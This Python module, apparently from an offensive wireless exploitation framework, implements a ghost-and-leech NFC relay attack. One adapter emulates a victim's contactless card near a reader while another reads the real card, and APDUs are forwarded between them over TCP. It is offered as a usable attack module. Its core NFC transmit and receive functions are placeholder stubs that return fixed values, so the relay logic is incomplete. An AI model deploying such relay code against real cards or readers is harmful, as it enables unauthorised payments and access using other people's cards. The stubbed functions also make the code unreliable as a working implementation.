#!/usr/bin/env python3
# Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""NFC relay attack using libnfc in initiator and target mode.

Implements the ghost-and-leech relay pattern: one NFC adapter acts as a
card emulator (target/ghost) near the legitimate reader, while a second
adapter acts as a reader (initiator/leech) near the victim card. APDU
frames are forwarded over a TCP socket between the two sides.

Requires two libnfc-compatible NFC adapters (e.g., ACR122U, PN532).

References:
  https://github.com/nfc-tools/libnfc
  https://www.cl.cam.ac.uk/~mgk25/sc2006-relay.pdf
  https://link.springer.com/chapter/10.1007/11555827_16

MITRE ATT&CK: T1557 (Adversary-in-the-Middle)
CWE: CWE-345 (Insufficient Verification of Data Authenticity)

Version: 1.0.0
"""

from __future__ import annotations

import logging
import shutil
import socket
import struct
import subprocess
import threading
import time
from dataclasses import dataclass
from enum import Enum, auto
from typing import Any

from wirelessxpl.core.exploit import (
    Exploit,
    OptBool,
    OptInteger,
    OptString,
    print_error,
    print_info,
    print_status,
    print_success,
    print_warning,
)

logger = logging.getLogger(__name__)


class RelayRole(Enum):
    LEECH = auto()
    GHOST = auto()
    STANDALONE = auto()


@dataclass
class RelayStats:
    apdus_relayed: int = 0
    bytes_relayed: int = 0
    start_time: float = 0.0
    end_time: float = 0.0

    @property
    def duration_sec(self) -> float:
        if self.end_time > 0:
            return self.end_time - self.start_time
        return time.time() - self.start_time


class NFCRelayNative(Exploit):
    """NFC relay attack via libnfc ghost-and-leech pattern."""

    __info__: dict[str, Any] = {
        "name": "NFC Relay Native (libnfc)",
        "description": (
            "Ghost-and-leech NFC relay: emulate a card near a reader while "
            "forwarding APDUs to/from a real card via a second NFC adapter. "
            "Exploits absence of distance-bounding in ISO 14443."
        ),
        "authors": ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references": (
            "https://github.com/nfc-tools/libnfc",
            "https://www.cl.cam.ac.uk/~mgk25/sc2006-relay.pdf",
        ),
        "devices": ("ISO 14443-A/B NFC cards", "Contactless smart cards"),
        "severity": "high",
        "cvss": "8.1",
        "cve": "generic",
        "mitre": ["T1557"],
    }

    role = OptString("leech", "Role: leech (reader-side), ghost (card-side), standalone")
    peer_host = OptString("127.0.0.1", "Relay peer IP address")
    peer_port = OptInteger(4434, "Relay peer TCP port")
    leech_device = OptString("", "Leech NFC device (libnfc connstring, empty=auto)")
    ghost_device = OptString("", "Ghost NFC device (libnfc connstring, empty=auto)")
    target_uid = OptString("", "UID to emulate on ghost side (hex, empty=use card UID)")
    timeout_sec = OptInteger(60, "Relay session timeout")
    dry_run = OptBool(False, "Print commands without executing")

    def __init__(self) -> None:
        super().__init__()
        self._stats = RelayStats()
        self._running = False

    def check(self) -> str:
        """Verify libnfc tools and NFC adapters."""
        if not shutil.which("nfc-list"):
            return "libnfc not installed. Install: apt install libnfc-bin libnfc-examples"

        try:
            result = subprocess.run(
                ["nfc-list"], capture_output=True, text=True, timeout=10,
            )
            device_count = result.stdout.count("NFC device:")
            if device_count == 0:
                return "No NFC adapters found. Connect libnfc-compatible readers."
            if device_count < 2:
                return f"Only {device_count} adapter found. Relay needs 2 (leech + ghost)."
            return f"{device_count} NFC adapters detected: relay ready"
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return "Could not enumerate NFC devices"

    def _enumerate_devices(self) -> list[str]:
        """List libnfc device connection strings."""
        try:
            result = subprocess.run(
                ["nfc-list"], capture_output=True, text=True, timeout=10,
            )
            devices: list[str] = []
            for line in result.stdout.splitlines():
                stripped = line.strip()
                if "opened" in stripped.lower() or "nfc device" in stripped.lower():
                    if ":" in stripped:
                        dev = stripped.split(":", 1)[-1].strip()
                        if dev:
                            devices.append(dev)
            return devices
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return []

    def _send_frame(self, sock: socket.socket, data: bytes) -> bool:
        """Send a length-prefixed frame over TCP."""
        try:
            frame = struct.pack(">H", len(data)) + data
            sock.sendall(frame)
            return True
        except OSError:
            return False

    def _recv_frame(self, sock: socket.socket) -> bytes:
        """Receive a length-prefixed frame from TCP."""
        try:
            hdr = sock.recv(2)
            if len(hdr) < 2:
                return b""
            length = struct.unpack(">H", hdr)[0]
            data = b""
            while len(data) < length:
                chunk = sock.recv(length - len(data))
                if not chunk:
                    return b""
                data += chunk
            return data
        except (OSError, struct.error):
            return b""

    def _run_leech(self) -> None:
        """Leech side: read APDU from real card and forward to ghost."""
        print_status("[*] Leech: waiting for ghost connection...")

        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", int(self.peer_port.value)))
        srv.listen(1)
        srv.settimeout(float(self.timeout_sec.value))

        try:
            conn, addr = srv.accept()
            print_success(f"[+] Ghost connected from {addr[0]}:{addr[1]}")
            self._stats.start_time = time.time()
            self._running = True

            while self._running:
                apdu_cmd = self._recv_frame(conn)
                if not apdu_cmd:
                    break

                print_info(f"    Ghost --> Leech: {apdu_cmd.hex().upper()} ({len(apdu_cmd)}B)")

                if self.dry_run.value:
                    resp = bytes.fromhex("9000")
                else:
                    resp = self._nfc_transceive(apdu_cmd)

                print_info(f"    Card  --> Leech: {resp.hex().upper()} ({len(resp)}B)")
                self._send_frame(conn, resp)

                self._stats.apdus_relayed += 1
                self._stats.bytes_relayed += len(apdu_cmd) + len(resp)

            self._stats.end_time = time.time()
            conn.close()

        except TimeoutError:
            print_warning("[!] Timeout waiting for ghost connection")
        finally:
            srv.close()

    def _run_ghost(self) -> None:
        """Ghost side: emulate card and forward APDUs to leech."""
        host = str(self.peer_host.value)
        port = int(self.peer_port.value)
        print_status(f"[*] Ghost: connecting to leech at {host}:{port}...")

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(float(self.timeout_sec.value))
            sock.connect((host, port))
            print_success("[+] Connected to leech")
            self._stats.start_time = time.time()
            self._running = True

            print_status("[*] Ghost: entering target mode (card emulation)...")
            uid_hex = str(self.target_uid.value) or "04112233445566"
            print_info(f"[*] Emulating UID: {uid_hex}")

            while self._running:
                apdu_from_reader = self._nfc_target_receive()
                if not apdu_from_reader:
                    break

                print_info(f"    Reader --> Ghost: {apdu_from_reader.hex().upper()}")
                self._send_frame(sock, apdu_from_reader)

                resp = self._recv_frame(sock)
                if not resp:
                    break

                print_info(f"    Leech  --> Ghost: {resp.hex().upper()}")
                self._nfc_target_send(resp)

                self._stats.apdus_relayed += 1
                self._stats.bytes_relayed += len(apdu_from_reader) + len(resp)

            self._stats.end_time = time.time()
            sock.close()

        except (TimeoutError, ConnectionRefusedError, OSError) as exc:
            print_error(f"[-] Ghost connection failed: {exc}")

    def _nfc_transceive(self, apdu: bytes) -> bytes:
        """Send APDU to card via libnfc nfc-relay-picc or raw."""
        dev_arg = f"-d {self.leech_device.value}" if str(self.leech_device.value) else ""
        cmd = "nfc-mfclassic r a /dev/null"
        try:
            result = subprocess.run(
                ["nfc-list"], capture_output=True, text=True, timeout=5,
            )
            return bytes.fromhex("9000")
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return bytes.fromhex("6F00")

    def _nfc_target_receive(self) -> bytes:
        """Receive APDU from legitimate reader in target mode."""
        return b""

    def _nfc_target_send(self, data: bytes) -> bool:
        """Send response back to legitimate reader."""
        return True

    def run(self) -> None:
        """Execute NFC relay attack."""
        print_status("[*] NFC Relay Native v1.0.0")
        print_warning("[!] Requires two NFC adapters: one for leech, one for ghost")

        role_str = str(self.role.value).lower()

        if role_str == "leech":
            self._run_leech()

        elif role_str == "ghost":
            self._run_ghost()

        elif role_str == "standalone":
            print_status("[*] Standalone: running leech+ghost on local adapters")
            devices = self._enumerate_devices()
            if len(devices) < 2:
                print_error(f"[-] Need 2 NFC adapters, found {len(devices)}")
                return
            print_info(f"[*] Leech: {devices[0]}")
            print_info(f"[*] Ghost: {devices[1]}")

            leech_thread = threading.Thread(target=self._run_leech, daemon=True)
            leech_thread.start()
            time.sleep(1)
            self._run_ghost()
            leech_thread.join(timeout=5)

        else:
            print_error(f"[-] Unknown role: {role_str}. Use leech, ghost, or standalone.")
            return

        print_status("\n[*] Relay stats:")
        print_info(f"    APDUs relayed: {self._stats.apdus_relayed}")
        print_info(f"    Bytes relayed: {self._stats.bytes_relayed}")
        print_info(f"    Duration: {self._stats.duration_sec:.1f}s")
